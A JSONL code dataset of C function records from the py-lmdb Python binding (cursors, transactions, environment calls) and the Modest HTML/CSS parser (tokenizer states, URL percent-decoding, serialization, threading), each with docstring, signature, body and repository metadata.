{"docstring": "/**\n * Remove `child` from `parent`'s list of dependent objects. Use UNLINK_CHILD\n * macro to avoid casting PyObject to lmdb_object.\n */\n", "func_signal": "static void unlink_child(struct lmdb_object *parent, struct lmdb_object *child)", "code": "{\n    if(parent) {\n        struct lmdb_object *prev = child->siblings.prev;\n        struct lmdb_object *next = child->siblings.next;\n        if(prev) {\n            prev->siblings.next = next;\n                 /* If double unlink_child(), this test my legitimately fail: */\n        } else if(parent->children.next == child) {\n            parent->children.next = next;\n        }\n        if(next) {\n            next->siblings.prev = prev;\n        }\n        child->siblings.prev = NULL;\n        child->siblings.next = NULL;\n    }\n}", "path": "py-lmdb/lmdb/cpython.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "jnwatson/py-lmdb", "stars": 609, "license": "other", "language": "c", "size": 3350}
{"docstring": "/**\n * Initialize a bunch of constants used to ease number compares.\n */\n", "func_signal": "static int init_constants(PyObject *mod)", "code": "{\n    if(! ((py_zero = PyLong_FromUnsignedLongLong(0)))) {\n        return -1;\n    }\n    if(! ((py_int_max = PyLong_FromUnsignedLongLong(INT_MAX)))) {\n        return -1;\n    }\n    if(! ((py_size_max = PyLong_FromUnsignedLongLong(SIZE_MAX)))) {\n        return -1;\n    }\n    return 0;\n}", "path": "py-lmdb/lmdb/cpython.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "jnwatson/py-lmdb", "stars": 609, "license": "other", "language": "c", "size": 3350}
{"docstring": "/**\n * Environment.copyfd(fd)\n */\n", "func_signal": "static PyObject *\nenv_copyfd(EnvObject *self, PyObject *args, PyObject *kwds)", "code": "{\n    struct env_copyfd {\n        int fd;\n        int compact;\n        TransObject *txn;\n    } arg = {-1, 0};\n    int rc;\n#ifdef HAVE_PATCHED_LMDB\n    MDB_txn *txn;\n#endif\n#ifdef _WIN32\n    PyObject *temp;\n    Py_ssize_t handle;\n#endif\n\n    static const struct argspec argspec[] = {\n        {\"fd\", ARG_INT, OFFSET(env_copyfd, fd)},\n        {\"compact\", ARG_BOOL, OFFSET(env_copyfd, compact)},\n        {\"txn\", ARG_TRANS, OFFSET(env_copyfd, txn)},\n    };\n    int flags;\n\n    static PyObject *cache = NULL;\n    if(parse_args(self->valid, SPECSIZE(), argspec, &cache, args, kwds, &arg)) {\n        return NULL;\n    }\n    if(arg.fd == -1) {\n        return type_error(\"fd argument required\");\n    }\n    flags = arg.compact ? MDB_CP_COMPACT : 0;\n\n#ifdef HAVE_PATCHED_LMDB\n    if (arg.txn) {\n        txn = arg.txn->txn;\n        if (!arg.compact) {\n            return type_error(\"txn argument only compatible with compact=True\");\n        }\n    }\n    else {\n        txn = NULL;\n    }\n#else\n    if (arg.txn) {\n        return type_error(\"Non-patched LMDB doesn't support transaction with env.copyfd\");\n    }\n#endif\n\n#ifdef _WIN32\n    temp = PyObject_CallMethod(msvcrt, \"get_osfhandle\", \"i\", arg.fd);\n    if(! temp) {\n        return NULL;\n    }\n    handle = PyNumber_AsSsize_t(temp, PyExc_OverflowError);\n    Py_DECREF(temp);\n    if(PyErr_Occurred()) {\n        return NULL;\n    }\n    #define HANDLE_ARG (HANDLE)handle\n#else\n    #define HANDLE_ARG arg.fd\n#endif\n\n#ifdef HAVE_PATCHED_LMDB\n    UNLOCKED(rc, mdb_env_copyfd3(self->env, HANDLE_ARG, flags, txn));\n#else\n    UNLOCKED(rc, mdb_env_copyfd2(self->env, HANDLE_ARG, flags));\n#endif\n\n    if(rc) {\n        return err_set(\"mdb_env_copyfd3\", rc);\n    }\n    Py_RETURN_NONE;\n}", "path": "py-lmdb/lmdb/cpython.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "jnwatson/py-lmdb", "stars": 609, "license": "other", "language": "c", "size": 3350}
{"docstring": "/**\n * Cursor.count() -> long\n */\n", "func_signal": "static PyObject *\ncursor_count(CursorObject *self)", "code": "{\n    size_t count;\n    int rc;\n\n    if(! self->valid) {\n        return err_invalid();\n    }\n\n    UNLOCKED(rc, mdb_cursor_count(self->curs, &count));\n    if(rc) {\n        return err_set(\"mdb_cursor_count\", rc);\n    }\n    return PyLong_FromUnsignedLongLong(count);\n}", "path": "py-lmdb/lmdb/cpython.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "jnwatson/py-lmdb", "stars": 609, "license": "other", "language": "c", "size": 3350}
{"docstring": "/**\n * Cursor.set_range(key) -> bool\n */\n", "func_signal": "static PyObject *\ncursor_set_range(CursorObject *self, PyObject *arg)", "code": "{\n    if(! self->valid) {\n        return err_invalid();\n    }\n    if(val_from_buffer(&self->key, arg)) {\n        return NULL;\n    }\n    if(self->key.mv_size) {\n        return _cursor_get(self, MDB_SET_RANGE);\n    }\n    return _cursor_get(self, MDB_FIRST);\n}", "path": "py-lmdb/lmdb/cpython.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "jnwatson/py-lmdb", "stars": 609, "license": "other", "language": "c", "size": 3350}
{"docstring": "/**\n * Construct a PyString and append it to a list, returning 0 on success or -1\n * on error.\n */\n", "func_signal": "static int\nappend_string(PyObject *list, const char *s)", "code": "{\n#if PY_MAJOR_VERSION >= 3\n    PyObject *o = PyUnicode_FromString(s);\n#else\n    PyObject *o = PyBytes_FromStringAndSize(s, strlen(s));\n#endif\n\n    if(! o) {\n        return -1;\n    }\n    if(PyList_Append(list, o)) {\n        Py_DECREF(o);\n        return -1;\n    }\n    Py_DECREF(o);\n    return 0;\n}", "path": "py-lmdb/lmdb/cpython.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "jnwatson/py-lmdb", "stars": 609, "license": "other", "language": "c", "size": 3350}
{"docstring": "/**\n * Environment.path() -> Unicode\n */\n", "func_signal": "static PyObject *\nenv_path(EnvObject *self)", "code": "{\n    const char *path;\n    int rc;\n\n    if(! self->valid) {\n        return err_invalid();\n    }\n\n    if((rc = mdb_env_get_path(self->env, &path))) {\n        return err_set(\"mdb_env_get_path\", rc);\n    }\n    return PyUnicode_FromString(path);\n}", "path": "py-lmdb/lmdb/cpython.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "jnwatson/py-lmdb", "stars": 609, "license": "other", "language": "c", "size": 3350}
{"docstring": "/**\n * Wrap _cursor_get_c() to return True or False depending on whether the\n * Cursor's final state is positioned.\n */\n", "func_signal": "static PyObject *\n_cursor_get(CursorObject *self, enum MDB_cursor_op op)", "code": "{\n    if(! self->valid) {\n        return err_invalid();\n    }\n    if(_cursor_get_c(self, op)) {\n        return NULL;\n    }\n    return py_bool(self->positioned);\n}", "path": "py-lmdb/lmdb/cpython.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "jnwatson/py-lmdb", "stars": 609, "license": "other", "language": "c", "size": 3350}
{"docstring": "/**\n * Like PyArg_ParseTupleAndKeywords except types are specialized for this\n * module, keyword strings aren't dup'd every call and the code is >3x smaller.\n */\n", "func_signal": "static int NOINLINE\nparse_args(int valid, int specsize, const struct argspec *argspec,\n           PyObject **cache, PyObject *args, PyObject *kwds, void *out)", "code": "{\n    unsigned set = 0;\n    unsigned i;\n\n    if(! valid) {\n        err_invalid();\n        return -1;\n    }\n\n    if(args) {\n        Py_ssize_t size = PyTuple_GET_SIZE(args);\n        if(size > specsize) {\n            type_error(\"too many positional arguments.\");\n            return -1;\n        }\n        if(specsize < size) {\n            size = specsize;\n        }\n        for(i = 0; i < size; i++) {\n            if(parse_arg(argspec + i, PyTuple_GET_ITEM(args, i), out)) {\n                return -1;\n            }\n            set |= 1 << i;\n        }\n    }\n\n    if(kwds) {\n        Py_ssize_t ppos = 0;\n        PyObject *pkey;\n        PyObject *pvalue;\n\n        if((! *cache) && make_arg_cache(specsize, argspec, cache)) {\n            return -1;\n        }\n\n        while(PyDict_Next(kwds, &ppos, &pkey, &pvalue)) {\n            PyObject *specidx;\n            int i;\n\n            if(! ((specidx = PyDict_GetItem(*cache, pkey)))) {\n                type_error(\"unrecognized keyword argument\");\n                return -1;\n            }\n\n            i = READ_ID(specidx);\n            if(set & (1 << i)) {\n                PyErr_Format(PyExc_TypeError, \"duplicate argument: %U\", pkey);\n                return -1;\n            }\n\n            if(parse_arg(argspec + i, pvalue, out)) {\n                return -1;\n            }\n        }\n    }\n    return 0;\n}", "path": "py-lmdb/lmdb/cpython.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "jnwatson/py-lmdb", "stars": 609, "license": "other", "language": "c", "size": 3350}
{"docstring": "/**\n * Transaction.get() -> result\n */\n", "func_signal": "static PyObject *\ntrans_get(TransObject *self, PyObject *args, PyObject *kwds)", "code": "{\n    struct trans_get {\n        MDB_val key;\n        PyObject *default_;\n        DbObject *db;\n    } arg = {{0, 0}, Py_None, self->db};\n\n    static const struct argspec argspec[] = {\n        {\"key\", ARG_BUF, OFFSET(trans_get, key)},\n        {\"default\", ARG_OBJ, OFFSET(trans_get, default_)},\n        {\"db\", ARG_DB, OFFSET(trans_get, db)}\n    };\n    MDB_val val;\n    int rc;\n\n    static PyObject *cache = NULL;\n    if(parse_args(self->valid, SPECSIZE(), argspec, &cache, args, kwds, &arg)) {\n        return NULL;\n    }\n    if(! db_owner_check(arg.db, self->env)) {\n        return NULL;\n    }\n\n    if(! arg.key.mv_data) {\n        return type_error(\"key must be given.\");\n    }\n\n    Py_BEGIN_ALLOW_THREADS\n    rc = mdb_get(self->txn, arg.db->dbi, &arg.key, &val);\n    preload(rc, val.mv_data, val.mv_size);\n    Py_END_ALLOW_THREADS\n\n    if(rc) {\n        if(rc == MDB_NOTFOUND) {\n            Py_INCREF(arg.default_);\n            return arg.default_;\n        }\n        return err_set(\"mdb_get\", rc);\n    }\n    return obj_from_val(&val, self->flags & TRANS_BUFFERS);\n}", "path": "py-lmdb/lmdb/cpython.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "jnwatson/py-lmdb", "stars": 609, "license": "other", "language": "c", "size": 3350}
{"docstring": "/* ------------ */\n/* Transactions */\n/* ------------ */\n", "func_signal": "static int\ntrans_clear(TransObject *self)", "code": "{\n    INVALIDATE(self)\n#ifdef HAVE_MEMSINK\n    ms_notify((PyObject *) self, &self->sink_head);\n#endif\n\n    if(self->txn) {\n        Py_BEGIN_ALLOW_THREADS\n        MDEBUG(\"aborting\")\n        mdb_txn_abort(self->txn);\n        Py_END_ALLOW_THREADS\n        self->txn = NULL;\n    }\n    MDEBUG(\"db is/was %p\", self->db)\n    Py_CLEAR(self->db);\n    self->valid = 0;\n    if(self->env) {\n        UNLINK_CHILD(self->env, self)\n        Py_CLEAR(self->env);\n    }\n    return 0;\n}", "path": "py-lmdb/lmdb/cpython.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "jnwatson/py-lmdb", "stars": 609, "license": "other", "language": "c", "size": 3350}
{"docstring": "/**\n * Transaction(env, db) -> new instance.\n */\n", "func_signal": "static PyObject *\ntrans_new(PyTypeObject *type, PyObject *args, PyObject *kwds)", "code": "{\n    struct trans_new {\n        EnvObject *env;\n        DbObject *db;\n        TransObject *parent;\n        int write;\n        int buffers;\n    } arg = {NULL, NULL, NULL, 0, 0};\n\n    static const struct argspec argspec[] = {\n        {\"env\", ARG_ENV, OFFSET(trans_new, env)},\n        {\"db\", ARG_DB, OFFSET(trans_new, db)},\n        {\"parent\", ARG_TRANS, OFFSET(trans_new, parent)},\n        {\"write\", ARG_BOOL, OFFSET(trans_new, write)},\n        {\"buffers\", ARG_BOOL, OFFSET(trans_new, buffers)}\n    };\n\n    static PyObject *cache = NULL;\n    if(parse_args(1, SPECSIZE(), argspec, &cache, args, kwds, &arg)) {\n        return NULL;\n    }\n    if(! arg.env) {\n        return type_error(\"'env' argument required\");\n    }\n    return make_trans(arg.env, arg.db, arg.parent, arg.write, arg.buffers);\n}", "path": "py-lmdb/lmdb/cpython.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "jnwatson/py-lmdb", "stars": 609, "license": "other", "language": "c", "size": 3350}
{"docstring": "/**\n * Cursor.getmulti() -> Iterable of (key, value)\n */\n", "func_signal": "static PyObject *\ncursor_get_multi(CursorObject *self, PyObject *args, PyObject *kwds)", "code": "{\n    struct cursor_get {\n        PyObject *keys;\n        int dupdata;\n        size_t dupfixed_bytes;\n        int keyfixed;\n    } arg = {Py_None, 0, 0, 0};\n\n    int i, as_buffer;\n    PyObject *iter, *item, *tup, *key, *val;\n    PyObject *pylist = NULL;\n    MDB_cursor_op get_op, next_op;\n    bool done, first;\n\n    static const struct argspec argspec[] = {\n        {\"keys\", ARG_OBJ, OFFSET(cursor_get, keys)},\n        {\"dupdata\", ARG_BOOL, OFFSET(cursor_get, dupdata)},\n        {\"dupfixed_bytes\", ARG_SIZE, OFFSET(cursor_get, dupfixed_bytes)},\n        {\"keyfixed\", ARG_BOOL, OFFSET(cursor_get, keyfixed)}\n    };\n\n    size_t buffer_pos = 0, buffer_size = 8;\n    size_t key_size, val_size, item_size;\n    char *buffer = NULL;\n\n    static PyObject *cache = NULL;\n    if(parse_args(self->valid, SPECSIZE(), argspec, &cache, args, kwds, &arg)) {\n        return NULL;\n    }\n\n    if(arg.dupfixed_bytes < 0) {\n        return type_error(\"dupfixed_bytes must be a positive integer.\");\n    }else if ((arg.dupfixed_bytes > 0 || arg.keyfixed) && !arg.dupdata) {\n        return type_error(\"dupdata is required for dupfixed_bytes/keyfixed.\");\n    }else if (arg.keyfixed && !arg.dupfixed_bytes){\n        return type_error(\"dupfixed_bytes is required for keyfixed.\");\n    }\n\n    if(! ((iter = PyObject_GetIter(arg.keys)))) {\n        return NULL;\n    }\n\n    /* Choose ops */\n    if(arg.dupfixed_bytes) {\n        get_op = MDB_GET_MULTIPLE;\n        next_op = MDB_NEXT_MULTIPLE;\n    } else {\n        get_op = MDB_GET_CURRENT;\n        next_op = MDB_NEXT_DUP;\n    }\n\n    as_buffer = self->trans->flags & TRANS_BUFFERS;\n    val_size = arg.dupfixed_bytes;\n    if (!arg.keyfixed){ /* Init list */\n        pylist = PyList_New(0);\n    }\n    first = true;\n    while((item = PyIter_Next(iter))) {\n        MDB_val mkey;\n\n        if(val_from_buffer(&mkey, item)) {\n            goto failiter;\n        } /* val_from_buffer sets exception */\n\n        self->key = mkey;\n        if(_cursor_get_c(self, MDB_SET_KEY)) {\n            goto failiter;\n        }\n\n        done = false;\n        while (!done) {\n\n            if(! self->positioned) {\n                done = true;\n            }\n            else if(_cursor_get_c(self, get_op)) {\n                goto failiter;\n            } else {\n                key = obj_from_val(&self->key, as_buffer);\n                PRELOAD_UNLOCKED(0, self->val.mv_data, self->val.mv_size);\n\n                if(!arg.dupfixed_bytes) {\n                    /* Not dupfixed, MDB_GET_CURRENT returns single item */\n                    val = obj_from_val(&self->val, as_buffer);\n                    tup = PyTuple_New(2);\n\n                    if (tup && key && val) {\n                        PyTuple_SET_ITEM(tup, 0, key);\n                        PyTuple_SET_ITEM(tup, 1, val);\n                        PyList_Append(pylist, tup);\n                        Py_DECREF(tup);\n                    } else {\n                        Py_DECREF(key);\n                        Py_DECREF(val);\n                        Py_DECREF(tup);\n                    }\n                } else {\n                    /* dupfixed, MDB_GET_MULTIPLE returns batch, iterate values */\n                    int items = (int) self->val.mv_size/val_size;\n                    if (first) {\n                        key_size = (size_t) self->key.mv_size;\n                        item_size = key_size + val_size;\n                        if (arg.keyfixed) { /* Init structured array buffer */\n                            buffer = malloc(buffer_size * item_size);\n                        }\n                        first = false;\n                    }\n\n                    for(i=0; i<items; i++) {\n                        char *val_data = (char *) self->val.mv_data + (i * val_size);\n                        if (arg.keyfixed) {\n                            /* Add to array buffer */\n                            char *k, *v;\n                            if (buffer_pos >= buffer_size) { // Grow buffer\n                                buffer_size = buffer_size * 2;\n                                buffer = realloc(buffer, buffer_size * item_size);\n                            }\n                            k = buffer + (buffer_pos * item_size);\n                            v = k + key_size;\n                            memcpy(k, (char *) self->key.mv_data, key_size);\n                            memcpy(v, val_data, val_size);\n\n                            buffer_pos++;\n                        } else {\n                            /* Add to list of tuples */\n                            if(as_buffer) {\n                                val = PyMemoryView_FromMemory(\n                                    val_data, (size_t) arg.dupfixed_bytes, PyBUF_READ);\n                            } else {\n                                val = PyBytes_FromStringAndSize(\n                                    val_data, (size_t) arg.dupfixed_bytes);\n                            }\n                            tup = PyTuple_New(2);\n                            if (tup && key && val) {\n                                Py_INCREF(key); // Hold key in loop\n                                PyTuple_SET_ITEM(tup, 0, key);\n                                PyTuple_SET_ITEM(tup, 1, val);\n                                PyList_Append(pylist, tup);\n                                Py_DECREF(tup);\n                            } else {\n                                Py_DECREF(val);\n                                Py_DECREF(tup);\n                            }\n                        }\n                    }\n                    Py_DECREF(key); // Release key\n                }\n\n                if(arg.dupdata){\n                    if(_cursor_get_c(self, next_op)) {\n                        goto failiter;\n                    }\n                }\n                else {\n                    done = true;\n                }\n            }\n        }\n        Py_DECREF(item);\n    }\n\n    Py_DECREF(iter);\n    if(PyErr_Occurred()) {\n        goto fail;\n    }\n\n    if (arg.keyfixed){\n        int rc;\n        Py_buffer pybuf;\n        size_t newsize = buffer_pos * item_size;\n        buffer = realloc(buffer, newsize);\n        rc = PyBuffer_FillInfo(&pybuf, NULL, buffer, newsize, 0, PyBUF_SIMPLE);\n        return PyMemoryView_FromBuffer(&pybuf);\n    } else {\n        return pylist;\n    }\n\nfailiter:\n    Py_DECREF(item);\n    Py_DECREF(iter);\nfail:\n    if (buffer) {\n        free(buffer);\n    };\n    return NULL;\n}", "path": "py-lmdb/lmdb/cpython.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "jnwatson/py-lmdb", "stars": 609, "license": "other", "language": "c", "size": 3350}
{"docstring": "/**\n * Use a temporary transaction to manufacture a new _Database object for\n * `name`.\n */\n", "func_signal": "static DbObject *\ntxn_db_from_name(EnvObject *env, const char *name,\n                 unsigned int flags)", "code": "{\n    int rc;\n    MDB_txn *txn;\n    DbObject *dbo;\n\n    int begin_flags = (name == NULL || env->readonly) ? MDB_RDONLY : 0;\n    UNLOCKED(rc, mdb_txn_begin(env->env, NULL, begin_flags, &txn));\n    if(rc) {\n        err_set(\"mdb_txn_begin\", rc);\n        return NULL;\n    }\n\n    if(! ((dbo = db_from_name(env, txn, name, flags)))) {\n        Py_BEGIN_ALLOW_THREADS\n        mdb_txn_abort(txn);\n        Py_END_ALLOW_THREADS\n        return NULL;\n    }\n\n    UNLOCKED(rc, mdb_txn_commit(txn));\n    if(rc) {\n        Py_DECREF(dbo);\n        return err_set(\"mdb_txn_commit\", rc);\n    }\n    return dbo;\n}", "path": "py-lmdb/lmdb/cpython.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "jnwatson/py-lmdb", "stars": 609, "license": "other", "language": "c", "size": 3350}
{"docstring": "/**\n * Environment.__exit__()\n */\n", "func_signal": "static PyObject *env_exit(EnvObject *self, PyObject *args)", "code": "{\n    env_clear(self);\n    Py_RETURN_NONE;\n}", "path": "py-lmdb/lmdb/cpython.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "jnwatson/py-lmdb", "stars": 609, "license": "other", "language": "c", "size": 3350}
{"docstring": "/**\n * Environment.flags() -> dict\n */\n", "func_signal": "static PyObject *\nenv_flags(EnvObject *self)", "code": "{\n    PyObject *dct;\n    unsigned int flags;\n    int rc;\n\n    if(! self->valid) {\n        return err_invalid();\n    }\n\n    if((rc = mdb_env_get_flags(self->env, &flags))) {\n        err_set(\"mdb_env_get_flags\", rc);\n        return NULL;\n    }\n\n    dct = PyDict_New();\n    PyDict_SetItemString(dct, \"subdir\", py_bool(!(flags & MDB_NOSUBDIR)));\n    PyDict_SetItemString(dct, \"readonly\", py_bool(flags & MDB_RDONLY));\n    PyDict_SetItemString(dct, \"metasync\", py_bool(!(flags & MDB_NOMETASYNC)));\n    PyDict_SetItemString(dct, \"sync\", py_bool(!(flags & MDB_NOSYNC)));\n    PyDict_SetItemString(dct, \"map_async\", py_bool(flags & MDB_MAPASYNC));\n    PyDict_SetItemString(dct, \"readahead\", py_bool(!(flags & MDB_NORDAHEAD)));\n    PyDict_SetItemString(dct, \"writemap\", py_bool(flags & MDB_WRITEMAP));\n    PyDict_SetItemString(dct, \"meminit\", py_bool(!(flags & MDB_NOMEMINIT)));\n    PyDict_SetItemString(dct, \"lock\", py_bool(!(flags & MDB_NOLOCK)));\n    return dct;\n}", "path": "py-lmdb/lmdb/cpython.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "jnwatson/py-lmdb", "stars": 609, "license": "other", "language": "c", "size": 3350}
{"docstring": "/**\n * Transaction.put() -> bool\n */\n", "func_signal": "static PyObject *\ntrans_put(TransObject *self, PyObject *args, PyObject *kwds)", "code": "{\n    struct trans_put {\n        MDB_val key;\n        MDB_val value;\n        int dupdata;\n        int overwrite;\n        int append;\n        DbObject *db;\n    } arg = {{0, 0}, {0, 0}, 1, 1, 0, self->db};\n\n    static const struct argspec argspec[] = {\n        {\"key\", ARG_BUF, OFFSET(trans_put, key)},\n        {\"value\", ARG_BUF, OFFSET(trans_put, value)},\n        {\"dupdata\", ARG_BOOL, OFFSET(trans_put, dupdata)},\n        {\"overwrite\", ARG_BOOL, OFFSET(trans_put, overwrite)},\n        {\"append\", ARG_BOOL, OFFSET(trans_put, append)},\n        {\"db\", ARG_DB, OFFSET(trans_put, db)}\n    };\n    int flags;\n    int rc;\n\n    static PyObject *cache = NULL;\n    if(parse_args(self->valid, SPECSIZE(), argspec, &cache, args, kwds, &arg)) {\n        return NULL;\n    }\n    if(! db_owner_check(arg.db, self->env)) {\n        return NULL;\n    }\n\n    flags = 0;\n    if(! arg.dupdata) {\n        flags |= MDB_NODUPDATA;\n    }\n    if(! arg.overwrite) {\n        flags |= MDB_NOOVERWRITE;\n    }\n    if(arg.append) {\n        flags |= MDB_APPEND;\n    }\n\n    DEBUG(\"inserting '%.*s' (%d) -> '%.*s' (%d)\",\n        (int)arg.key.mv_size, (char *)arg.key.mv_data,\n        (int)arg.key.mv_size,\n        (int)arg.value.mv_size, (char *)arg.value.mv_data,\n        (int)arg.value.mv_size)\n\n    self->mutations++;\n    UNLOCKED(rc, mdb_put(self->txn, (arg.db)->dbi,\n                         &arg.key, &arg.value, flags));\n    if(rc) {\n        if(rc == MDB_KEYEXIST) {\n            Py_RETURN_FALSE;\n        }\n        return err_set(\"mdb_put\", rc);\n    }\n    Py_RETURN_TRUE;\n}", "path": "py-lmdb/lmdb/cpython.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "jnwatson/py-lmdb", "stars": 609, "license": "other", "language": "c", "size": 3350}
{"docstring": "/**\n * Transaction.stat() -> dict\n */\n", "func_signal": "static PyObject *\ntrans_stat(TransObject *self, PyObject *args, PyObject *kwds)", "code": "{\n    struct trans_stat {\n        DbObject *db;\n    } arg = {self->db};\n\n    static const struct argspec argspec[] = {\n        {\"db\", ARG_DB, OFFSET(trans_stat, db)}\n    };\n    MDB_stat st;\n    int rc;\n\n    static PyObject *cache = NULL;\n    if(parse_args(self->valid, SPECSIZE(), argspec, &cache, args, kwds, &arg)) {\n        return NULL;\n    }\n    if(! db_owner_check(arg.db, self->env)) {\n        return NULL;\n    }\n\n    UNLOCKED(rc, mdb_stat(self->txn, arg.db->dbi, &st));\n    if(rc) {\n        return err_set(\"mdb_stat\", rc);\n    }\n    return dict_from_fields(&st, mdb_stat_fields);\n}", "path": "py-lmdb/lmdb/cpython.c", "commit_date": "2020-10-12 00:00:00", "repo_name": "jnwatson/py-lmdb", "stars": 609, "license": "other", "language": "c", "size": 3350}
{"docstring": "/////////////////////////////////////////////////////////\n//// U+002F SOLIDUS (/)\n////\n/////////////////////////////////////////////////////////\n", "func_signal": "size_t mycss_tokenizer_end_state_solidus(mycss_entry_t* entry, mycss_token_t* token, const char* css, size_t css_offset, size_t css_size)", "code": "{\n    token->length = 1;\n    token->type = MyCSS_TOKEN_TYPE_DELIM;\n    \n    MyCSS_TOKEN_READY_CALLBACK_FUNCTION(entry, token);\n    return css_size;\n}", "path": "Modest/source/mycss/tokenizer_end.c", "commit_date": "2017-03-14 00:00:00", "repo_name": "lexborisov/Modest", "stars": 712, "license": "lgpl-2.1", "language": "c", "size": 6569}
{"docstring": "/* converter */\n", "func_signal": "size_t myurl_utils_percent_decode_bytes_in_data(char* data, size_t size)", "code": "{\n    unsigned char *u_data = (unsigned char*)data;\n    unsigned char tmp = '\\0';\n    \n    size_t len = 0, offset = 0;\n    while(len < size)\n    {\n        if(u_data[len] == '%' && (len + 2) < size) {\n            size_t pos = len;\n            len++;\n            \n            if(mycore_string_chars_hex_map[ u_data[len] ] != 0xFF &&\n               mycore_string_chars_hex_map[ u_data[(len + 1)] ] != 0xFF)\n            {\n                tmp = mycore_string_chars_hex_map[ u_data[len] ];\n                tmp = (tmp << 4) | mycore_string_chars_hex_map[ u_data[(len + 1)] ];\n                \n                u_data[(pos - offset)] = tmp;\n                \n                offset += 2;\n                len++;\n            }\n            else {\n                len--;\n                \n                if(offset)\n                    u_data[(len - offset)] = data[len];\n            }\n            \n            len++;\n        }\n        else {\n            if(offset)\n                u_data[(len - offset)] = data[len];\n            \n            len++;\n        }\n    }\n    \n    if(offset) {\n        size_t new_size = (len - offset);\n        data[new_size] = '\\0';\n        \n        return new_size;\n    }\n    \n    return size;\n}", "path": "Modest/source/myurl/utils.c", "commit_date": "2017-03-14 00:00:00", "repo_name": "lexborisov/Modest", "stars": 712, "license": "lgpl-2.1", "language": "c", "size": 6569}
{"docstring": "/**\n *  Reallocate the buffer\n *  @param  str         the buffer to reallocate\n *  @param  size        new size\n */\n", "func_signal": "mystatus_t myhtml_serialization_reallocate(mycore_string_raw_t *str, size_t size)", "code": "{\n    // construct a buffer\n    char *data = (char*)mycore_realloc(str->data, size * sizeof(char));\n\n    // was it ok?\n    if(data == NULL) {\n        memset(str, 0, sizeof(mycore_string_raw_t));\n        return MyCORE_STATUS_ERROR_MEMORY_ALLOCATION;\n    }\n    else {\n        // reallocation succeeded\n        str->data = data;\n        str->size = size;\n    }\n    \n    return MyCORE_STATUS_OK;\n}", "path": "Modest/source/myhtml/serialization.c", "commit_date": "2019-01-12 00:00:00", "repo_name": "lexborisov/Modest", "stars": 712, "license": "lgpl-2.1", "language": "c", "size": 6569}
{"docstring": "/* Callbacks */\n", "func_signal": "void mythread_callback_quit(mythread_t* mythread, mythread_entry_t* entry, void* ctx)", "code": "{\n    while((entry->context.opt & MyTHREAD_OPT_QUIT) == 0)\n        mythread_nanosleep_sleep(mythread->timespec);\n}", "path": "Modest/source/mycore/mythread.c", "commit_date": "2017-03-13 00:00:00", "repo_name": "lexborisov/Modest", "stars": 712, "license": "lgpl-2.1", "language": "c", "size": 6569}
{"docstring": "/////////////////////////////////////////////////////////\n//// U+002A ASTERISK (*)\n////\n/////////////////////////////////////////////////////////\n", "func_signal": "size_t mycss_tokenizer_end_state_asterisk(mycss_entry_t* entry, mycss_token_t* token, const char* css, size_t css_offset, size_t css_size)", "code": "{\n    token->length = 1;\n    token->type = MyCSS_TOKEN_TYPE_DELIM;\n    \n    MyCSS_TOKEN_READY_CALLBACK_FUNCTION(entry, token);\n    return css_size;\n}", "path": "Modest/source/mycss/tokenizer_end.c", "commit_date": "2017-03-14 00:00:00", "repo_name": "lexborisov/Modest", "stars": 712, "license": "lgpl-2.1", "language": "c", "size": 6569}
{"docstring": "/*\n * Global functions, for all threads\n */\n", "func_signal": "mystatus_t mythread_join(mythread_t *mythread, mythread_callback_before_entry_join_f before_join, void* ctx)", "code": "{\n    for (size_t i = 0; i < mythread->entries_length; i++) {\n        if(before_join)\n            before_join(mythread, &mythread->entries[i], ctx);\n        \n        if(mythread_thread_join(mythread, mythread->entries[i].thread))\n            return MyCORE_STATUS_ERROR;\n    }\n    \n    return MyCORE_STATUS_OK;\n}", "path": "Modest/source/mycore/mythread.c", "commit_date": "2017-03-13 00:00:00", "repo_name": "lexborisov/Modest", "stars": 712, "license": "lgpl-2.1", "language": "c", "size": 6569}
{"docstring": "/////////////////////////////////////////////////////////\n//// Consume a numeric\n////\n/////////////////////////////////////////////////////////\n", "func_signal": "size_t mycss_tokenizer_end_global_state_numeric(mycss_entry_t* entry, mycss_token_t* token, const char* css, size_t css_offset, size_t css_size)", "code": "{\n    token->length = (entry->current_buffer->offset + css_offset) - token->begin;\n    token->type   = MyCSS_TOKEN_TYPE_NUMBER;\n    \n    MyCSS_TOKEN_READY_CALLBACK_FUNCTION(entry, token);\n    return css_size;\n}", "path": "Modest/source/mycss/tokenizer_end.c", "commit_date": "2017-03-14 00:00:00", "repo_name": "lexborisov/Modest", "stars": 712, "license": "lgpl-2.1", "language": "c", "size": 6569}
{"docstring": "/////////////////////////////////////////////////////////\n//// U+005B LEFT SQUARE BRACKET ([)\n////\n/////////////////////////////////////////////////////////\n", "func_signal": "size_t mycss_tokenizer_end_state_left_square_bracket(mycss_entry_t* entry, mycss_token_t* token, const char* css, size_t css_offset, size_t css_size)", "code": "{\n    token->length = 1;\n    token->type   = MyCSS_TOKEN_TYPE_LEFT_SQUARE_BRACKET;\n    \n    MyCSS_TOKEN_READY_CALLBACK_FUNCTION(entry, token);\n    return css_size;\n}", "path": "Modest/source/mycss/tokenizer_end.c", "commit_date": "2017-03-14 00:00:00", "repo_name": "lexborisov/Modest", "stars": 712, "license": "lgpl-2.1", "language": "c", "size": 6569}
